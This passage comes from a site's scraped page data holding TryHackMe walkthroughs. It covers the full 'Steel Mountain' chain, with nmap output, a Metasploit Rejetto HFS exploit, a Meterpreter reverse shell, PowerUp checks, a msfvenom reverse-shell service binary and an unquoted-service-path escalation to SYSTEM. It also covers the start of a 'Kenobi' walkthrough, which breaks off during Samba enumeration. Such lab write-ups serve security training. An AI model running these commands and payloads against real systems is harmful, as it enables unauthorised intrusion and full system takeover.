Scan at 22:58, 0.22s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 22:58 Completed Parallel DNS resolution of 1 host. at 22:58, 0.11s elapsed DNS resolution of 1 IPs took 0.11s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 22:58 Scanning 10.10.70.179 [15 ports] Discovered open port 445/tcp on 10.10.70.179 Discovered open port 3389/tcp on 10.10.70.179 Discovered open port 8080/tcp on 10.10.70.179 Discovered open port 80/tcp on 10.10.70.179 Discovered open port 139/tcp on 10.10.70.179 Discovered open port 135/tcp on 10.10.70.179 Discovered open port 47001/tcp on 10.10.70.179 Discovered open port 49170/tcp on 10.10.70.179 Discovered open port 49153/tcp on 10.10.70.179 Discovered open port 49154/tcp on 10.10.70.179 Discovered open port 49156/tcp on 10.10.70.179 Discovered open port 49155/tcp on 10.10.70.179 Discovered open port 49152/tcp on 10.10.70.179 Discovered open port 49169/tcp on 10.10.70.179 Discovered open port 5985/tcp on 10.10.70.179 Completed SYN Stealth Scan at 22:58, 0.27s elapsed (15 total ports) Initiating Service scan at 22:58 Scanning 15 services on 10.10.70.179 Service scan Timing: About 53.33% done; ETC: 23:00 (0:00:49 remaining) Completed Service scan at 22:59, 76.97s elapsed (15 services on 1 host) NSE: Script scanning 10.10.70.179. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 5.85s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 0.54s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 0.00s elapsed Nmap scan report for 10.10.70.179 Host is up, received reset ttl 125 (0.13s latency). Scanned at 2024-05-23 22:58:33 EDT for 84s PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 8.5 |_http-server-header: Microsoft-IIS/8.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026#39;t have a title (text/html). 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 125 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 3389/tcp open ssl/ms-wbt-server? syn-ack ttl 125 | ssl-cert: Subject: commonName=steelmountain | Issuer: commonName=steelmountain | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2024-05-23T02:56:08 | Not valid after: 2024-11-22T02:56:08 | MD5: 6e4d153ae7ee1b320d9d72afe32c2c46 | SHA-1: a0ccbed37da0eee5c10a1ebd4d6076f8f937545e | -----BEGIN CERTIFICATE----- | MIIC3jCCAcagAwIBAgIQautoTBW/+rhJokpnnG26hjANBgkqhkiG9w0BAQUFADAY | MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTI0MDUyMzAyNTYwOFoXDTI0MTEy | MjAyNTYwOFowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN | AQEBBQADggEPADCCAQoCggEBAN3PQ47ytbMM3aObC6EF69B0V7Iex2ys1WYOJZGo | 8CDMjdF29eM0rBRlEc7xuXQRX8UM7IkKUORcRHJsklrJgtvDg6q8LKucJL4Zj55k | 5lO2yzBlgPFg1X5zFjlXEu+Ytg8u7Q0WndlU28Jq4bYmspuapajhB97pPxdJ3cv4 | Q32mZE4cwyXIRE/CCX7RvTLpFUXJT2Vqu917y8XUeXI4uO1zMU6F5PRyLLx1T3MS | Kq/IN4FvqE8Af+T9UYkGCD+TXrIG14RZ7GisgoeR5BXnB7wPhRhJfb0NjpAeWSu3 | vJE+RzlcGzszwxoBdR/E/ufXbJX8FY69o9YiUNrG8VVkoDMCAwEAAaMkMCIwEwYD | VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB | AQBG/Ec+cj2a6PMxM7aUswvDGShDvneTBiwDcjRQmz4Vo7z3M5KLku1tTmgzHp/O | 1IH9aNmXWZK2VA42i6bKLIuJ57/7AhAwMbDIgFdck2ddkXGHP11qe2GroMExUEA8 | W7xRe8+RQ37ytWxB7fEn9VXAMsnV3h8bby1uNmnrmVoGbfMiP0Y6i2NijngVAJrf | /tBVFR7rjwjhg7b9GiDTXlnFNjZI/Wo9ThfhWR3grvEOMoPKaBUPkG7QzCQpoeDw | uA8gTVdJTTqoIaVQGvG5w1+xj1NQplP86/UZhVVQy/TzNJMtiRqhJeH1MAyaZTO7 | NnTbtK6ktlldHTWURZkG9J2P |_-----END CERTIFICATE----- | rdp-ntlm-info: | Target_Name: STEELMOUNTAIN | NetBIOS_Domain_Name: STEELMOUNTAIN | NetBIOS_Computer_Name: STEELMOUNTAIN | DNS_Domain_Name: steelmountain | DNS_Computer_Name: steelmountain | Product_Version: 6.3.9600 |_ System_Time: 2024-05-24T02:59:51+00:00 |_ssl-date: 2024-05-24T02:59:56+00:00; 0s from scanner time. 5985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8080/tcp open http syn-ack ttl 125 HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 | http-methods: |_ Supported Methods: GET HEAD POST |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1 |_http-title: HFS / 47001/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49152/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49153/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49155/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49156/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49169/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49170/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 302: |_ Message signing enabled but not required | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 33062/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 19020/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 53324/udp): CLEAN (Timeout) | Check 4 (port 25253/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02e7560a719d (unknown) | Names: | STEELMOUNTAIN\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | STEELMOUNTAIN\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 02e7560a719d0000000000000000000000 | 0000000000000000000000000000000000 |_ 0000000000000000000000000000 | smb2-time: | date: 2024-05-24T02:59:50 |_ start_date: 2024-05-24T02:56:01 |_clock-skew: mean: 0s, deviation: 0s, median: 0s NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 84.37 seconds Raw packets sent: 19 (812B) | Rcvd: 16 (700B) Enumeration # There are a lot of ports open and since port 80 is open we will check what\u0026rsquo;s running on that port.\nThere is an image displaying their employee of the month and we can see the name Steel Mountain which might be an organization.\nWhile opening the image in a new tab we can see the name of the image as Bill Harper.\nhttp://10.10.70.179/img/BillHarper.png\nNow, we will check what\u0026rsquo;s running on port 8080. We can see that there is some file server running. Under the server information, there is mentioned that it is HttpFileServer 2.3.\n#Server information HttpFileServer 2.3 Server time: 5/23/2024 8:04:24 PM Server uptime: 00:07:51 On clicking that leads us to this page which shows that it is a Rejetto HttpFileServer 2.3.\n\u0026lt;fieldset id=\u0026#39;serverinfo\u0026#39;\u0026gt; \u0026lt;legend\u0026gt;\u0026lt;img src=\u0026#34;/~img0\u0026#34;\u0026gt; Server information\u0026lt;/legend\u0026gt; \u0026lt;a href=\u0026#34;http://www.rejetto.com/hfs/\u0026#34;\u0026gt;HttpFileServer 2.3\u0026lt;/a\u0026gt; \u0026lt;br /\u0026gt;Server time: 5/23/2024 8:05:49 PM \u0026lt;br /\u0026gt;Server uptime: 00:09:15 \u0026lt;/fieldset\u0026gt; Exploitation # We will search in metasploit if we can find any exploits.\nmsf6 \u0026gt; search rejetto Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/http/rejetto_hfs_exec 2014-09-11 excellent Yes Rejetto HttpFileServer Remote Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec msf6 \u0026gt; info 0 Name: Rejetto HttpFileServer Remote Command Execution Module: exploit/windows/http/rejetto_hfs_exec Platform: Windows Arch: Privileged: No License: Metasploit Framework License (BSD) Rank: Excellent Disclosed: 2014-09-11 Provided by: Daniele Linguaglossa \u0026lt;danielelinguaglossa@gmail.com\u0026gt; Muhamad Fadzil Ramli \u0026lt;mind1355@gmail.com\u0026gt; We found a module which is successfully tested on the version 2.3b. So, we will use this.\nDescription: Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by using \u0026#39;%00\u0026#39; to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8. References: https://nvd.nist.gov/vuln/detail/CVE-2014-6287 OSVDB (111386) https://seclists.org/bugtraq/2014/Sep/85 http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands We will set all the required options.\nset rhost 10.10.70.179 set rport 8080 set lhost tun0 Run the exploit.\nexploit msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; exploit [*] Started reverse TCP handler on 10.6.10.164:4444 [*] Using URL: http://10.6.10.164:8080/okBb9lTf [*] Server started. [*] Sending a malicious request to / [*] Payload request received: /okBb9lTf [*] Sending stage (175686 bytes) to 10.10.70.179 [!] Tried to delete %TEMP%\\cGZQGuu.vbs, unknown result [*] Meterpreter session 1 opened (10.6.10.164:4444 -\u0026gt; 10.10.70.179:63844) at 2024-05-23 23:14:00 -0400 [*] Server stopped. meterpreter \u0026gt; sysinfo Computer : STEELMOUNTAIN OS : Windows Server 2012 R2 (6.3 Build 9600). Architecture : x64 System Language : en_US Domain : WORKGROUP Logged On Users : 1 Meterpreter : x86/windows meterpreter \u0026gt; We got the meterpreter reverse shell and we can read the user flag.\nmeterpreter \u0026gt; shell Process 1056 created. Channel 2 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0026gt;cd C:\\Users\\Bill\\Desktop cd c:\\users\\bill\\desktop c:\\Users\\bill\\Desktop\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 2E4A-906A Directory of c:\\Users\\bill\\Desktop 09/27/2019 09:08 AM \u0026lt;DIR\u0026gt; . 09/27/2019 09:08 AM \u0026lt;DIR\u0026gt; .. 09/27/2019 05:42 AM 70 user.txt 1 File(s) 70 bytes 2 Dir(s) 44,155,789,312 bytes free c:\\Users\\bill\\Desktop\u0026gt; Privilege Escalation # Now, we will elevate our privileges. We will download the powershell script which can find common Windows privilege escalation vectors that rely on misconfigurations in the target. We will first download the script to our machine.\nLet\u0026rsquo;s upload it to the target.\nupload powerup.ps1 meterpreter \u0026gt; upload powerup.ps1 [*] Uploading : /root/tryhackme/powerup.ps1 -\u0026gt; powerup.ps1 [*] Uploaded 483.26 KiB of 483.26 KiB (100.0%): /root/tryhackme/powerup.ps1 -\u0026gt; powerup.ps1 [*] Completed : /root/tryhackme/powerup.ps1 -\u0026gt; powerup.ps1 meterpreter \u0026gt; load powershell Loading extension powershell...Success. meterpreter \u0026gt; powershell_shell PS \u0026gt; dir Directory: C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup Mode LastWriteTime Length Name ---- ------------- ------ ---- d---- 5/23/2024 8:13 PM %TEMP% -a--- 2/16/2014 12:58 PM 760320 hfs.exe -a--- 5/23/2024 8:19 PM 494860 powerup.ps1 PS \u0026gt; Load the powershell module and use powershell.\nload powershell powershell_shell Run the script PowerUp.ps1 that we just downloaded into the target and run it.\n. .\\powerup.ps1 We will now run all the checks in this module using the following command.\nInvoke-AllChecks PS \u0026gt; . .\\powerup.ps1 PS \u0026gt; Invoke-AllChecks [*] Running Invoke-AllChecks [*] Checking if user is in a local group with administrative privileges... [*] Checking for unquoted service paths... ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName \u0026#39;AdvancedSystemCareService9\u0026#39; -Path \u0026lt;HijackPath\u0026gt; ServiceName : AWSLiteAgent Path : C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName \u0026#39;AWSLiteAgent\u0026#39; -Path \u0026lt;HijackPath\u0026gt; ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName \u0026#39;IObitUnSvr\u0026#39; -Path \u0026lt;HijackPath\u0026gt; ServiceName : LiveUpdateSvc Path : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName \u0026#39;LiveUpdateSvc\u0026#39; -Path \u0026lt;HijackPath\u0026gt; [*] Checking service executable and argument permissions... ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiableFile : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe StartName : LocalSystem AbuseFunction : Install-ServiceBinary -ServiceName \u0026#39;IObitUnSvr\u0026#39; [*] Checking service permissions... [*] Checking %PATH% for potentially hijackable .dll locations... HijackablePath : C:\\Windows\\system32\\ AbuseFunction : Write-HijackDll -OutputFile \u0026#39;C:\\Windows\\system32\\\\wlbsctrl.dll\u0026#39; -Command \u0026#39;...\u0026#39; HijackablePath : C:\\Windows\\ AbuseFunction : Write-HijackDll -OutputFile \u0026#39;C:\\Windows\\\\wlbsctrl.dll\u0026#39; -Command \u0026#39;...\u0026#39; HijackablePath : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ AbuseFunction : Write-HijackDll -OutputFile \u0026#39;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\\\wlbsctrl.dll\u0026#39; -Command \u0026#39;...\u0026#39; When we run the command, we can see that there is a unquoted service path vulnerability as we can see it in the checks. More information on unquoted service path vulnerability can be found here.\n❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.70.179 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of exe-service file: 15872 bytes Saved as: Advanced.exe For the service AdvancedSystemCareService9, the CanRestart option is set to true which means that the service can be restarted. We will now create a malicious file and upload it in the IObit folder and then restart the service to get the reverse shell. The file name is set to Advanced because we are uploading the file into the path where the Advanced SystemCare folder is present as we know there is an unquoted service path vulnerability. Since the service AdvancedSystemCareService9 is running as system32, we will be getting a reverse shell as system32.\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.2.217 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe Exit the powershell. Using the earlier meterpreter reverse shell, change directory to the path IObit and then upload the malicious file that we created.\nupload Advanced.exe meterpreter \u0026gt; ls Listing: C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup ==================================================================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 040777/rwxrwxrwx 0 dir 2024-05-23 23:26:39 -0400 %TEMP% 100777/rwxrwxrwx 15872 fil 2024-05-23 23:27:14 -0400 Advanced.exe 100666/rw-rw-rw- 10178 fil 2024-05-23 23:23:18 -0400 Invoke-AllChecks 100666/rw-rw-rw- 174 fil 2019-09-27 07:07:07 -0400 desktop.ini 100777/rwxrwxrwx 760320 fil 2014-02-16 15:58:52 -0500 hfs.exe 100666/rw-rw-rw- 494860 fil 2024-05-23 23:19:57 -0400 powerup.ps1 Open another terminal and use netcat listener on port 4443 to get the reverse shell.\nnc -lnvp 4443 Now, load the command prompt shell using the command in the meterpreter shell.\nshell Restart the AdvancedSystemCareService9 service by using the following commands.\nsc stop AdvancedSystemCareService9 sc start AdvancedSystemCareService9 Now we get a reverse shell in the other terminal window running as system32!\n❯ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.6.29.149] from (UNKNOWN) [10.10.70.179] 49343 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C: \\Windows\\system32\u0026gt; "},{"id":9,"href":"/posts/Kenobi/","title":"Kenobi","section":"Blog","content":" Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.\nhttps://tryhackme.com/r/room/kenobi\nScanning # First we will deploy the machine and scan the target using rustscan.\n❯ rustscan -a 10.10.112.104 -- -sVC | lolcat .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- 0day was here ♥ [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.112.104:21 Open 10.10.112.104:22 Open 10.10.112.104:80 Open 10.10.112.104:111 Open 10.10.112.104:139 Open 10.10.112.104:445 Open 10.10.112.104:2049 Open 10.10.112.104:39105 Open 10.10.112.104:44337 Open 10.10.112.104:51941 Open 10.10.112.104:56481 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.112.104 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-24 19:45 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 19:45 Completed NSE at 19:45, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 19:45 Completed NSE at 19:45, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 19:45 Completed NSE at 19:45, 0.00s elapsed Initiating Ping Scan at 19:45 Scanning 10.10.112.104 [4 ports] Completed Ping Scan at 19:45, 0.15s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:45 Completed Parallel DNS resolution of 1 host. at 19:45, 0.04s elapsed DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 19:45 Scanning 10.10.112.104 [11 ports] Discovered open port 22/tcp on 10.10.112.104 Discovered open port 139/tcp on 10.10.112.104 Discovered open port 80/tcp on 10.10.112.104 Discovered open port 21/tcp on 10.10.112.104 Discovered open port 56481/tcp on 10.10.112.104 Discovered open port 445/tcp on 10.10.112.104 Discovered open port 39105/tcp on 10.10.112.104 Discovered open port 111/tcp on 10.10.112.104 Discovered open port 44337/tcp on 10.10.112.104 Discovered open port 2049/tcp on 10.10.112.104 Discovered open port 51941/tcp on 10.10.112.104 Completed SYN Stealth Scan at 19:45, 0.27s elapsed (11 total ports) Initiating Service scan at 19:45 Scanning 11 services on 10.10.112.104 Completed Service scan at 19:46, 12.08s elapsed (11 services on 1 host) NSE: Script scanning 10.10.112.104. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 3.95s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 0.99s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed Nmap scan report for 10.10.112.104 Host is up, received timestamp-reply ttl 61 (0.12s latency). Scanned at 2024-05-24 19:45:50 EDT for 18s PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 61 ProFTPD 1.3.5 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b3ad834149e95d168d3b0f057be2c0ae (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj | 256 f8277d642997e6f865546522f7c81d8a (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8= | 256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/admin.html | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) 111/tcp open rpcbind syn-ack ttl 61 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100003 2,3,4 2049/udp nfs | 100003 2,3,4 2049/udp6 nfs | 100005 1,2,3 36941/udp mountd | 100005 1,2,3 44306/udp6 mountd | 100005 1,2,3 50675/tcp6 mountd | 100005 1,2,3 56481/tcp mountd | 100021 1,3,4 41673/tcp6 nlockmgr | 100021 1,3,4 44337/tcp nlockmgr | 100021 1,3,4 45479/udp6 nlockmgr | 100021 1,3,4 59376/udp nlockmgr | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl | 100227 2,3 2049/udp nfs_acl |_ 100227 2,3 2049/udp6 nfs_acl 139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 2049/tcp open nfs_acl syn-ack ttl 61 2-3 (RPC #100227) 39105/tcp open mountd syn-ack ttl 61 1-3 (RPC #100005) 44337/tcp open nlockmgr syn-ack ttl 61 1-4 (RPC #100021) 51941/tcp open mountd syn-ack ttl 61 1-3 (RPC #100005) 56481/tcp open mountd syn-ack ttl 61 1-3 (RPC #100005) Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 56068/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 32401/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 8514/udp): CLEAN (Failed to receive data) | Check 4 (port 35266/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked |_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s | nbstat: NetBIOS name: KENOBI, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) | Names: | KENOBI\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | KENOBI\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | KENOBI\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 0000000000000000000000000000000000 | 0000000000000000000000000000000000 |_ 0000000000000000000000000000 | smb2-time: | date: 2024-05-24T23:46:04 |_ start_date: N/A | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: kenobi | NetBIOS computer name: KENOBI\\x00 | Domain name: \\x00 | FQDN: kenobi |_ System time: 2024-05-24T18:46:04-05:00 | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.86 seconds Raw packets sent: 15 (636B) | Rcvd: 12 (524B) Enumeration # We can see that there is Samba file server running, so let\u0026rsquo;s find the available shares.\n❯ smbclient -L 10.10.112.104 Password for [WORKGROUP\\root]: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers anonymous Disk IPC$ IPC IPC Service (kenobi server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP KENOBI root@kali ~/tryhackme 6s ❯ We will now try to connect to the anonymous share.\n❯ smbclient \\\\\\\\10.10.112.104\\\\anonymous Password for [WORKGROUP\\root]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Wed Sep 4 06:49:09 2019 .. D 0 Wed Sep 4 06:56:07 2019 log.txt N 12237 Wed Sep 4 06:49:09 2019 9204224 blocks of size 1024. 6876708 blocks available smb: \\\u0026gt; get log.txt getting file \\log.txt of size 12237 as log.txt (25.4 KiloBytes/sec) (average 25.2 KiloBytes/sec) smb: \\\u0026gt; When we read the log.txt file, we can see the user is kenobi, the id_rsa file path and the ftp running on port 21.\nGenerating public/private rsa key pair. Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): Created directory \u0026#39;/home/kenobi/.ssh\u0026#39;. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/kenobi/.ssh/id_rsa. Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub. The key fingerprint is: SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi The key\u0026#39;s randomart image is: +---[RSA 2048]----+ | | | .. | | . o. . | | ..=o +. | | . So.o++o. | | o ...+oo.Bo*o | | o 